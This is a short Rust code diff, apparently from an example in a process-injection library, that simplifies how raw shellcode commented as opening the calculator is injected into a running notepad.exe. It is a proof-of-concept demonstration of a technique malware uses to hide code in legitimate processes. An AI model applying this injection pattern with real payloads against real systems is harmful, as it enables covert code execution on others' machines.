@@ -1,4 +1,4 @@
-use needle::{find_process, inject, Payload};
+use needle::{find_process, inject};
 
 const SHELL_CODE: &[u8] = &[
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
@@ -22,9 +22,8 @@ const SHELL_CODE: &[u8] = &[
 ]; // Open calculator
 
 fn main() {
-    let payload = Payload::from(SHELL_CODE);
     let process = find_process("notepad.exe").expect("Target process not found");
-    if let Err(e) = inject(process, payload) {
+    if let Err(e) = inject(process, SHELL_CODE) {
         println!("Could not inject payload: {}", e);
     }
 }
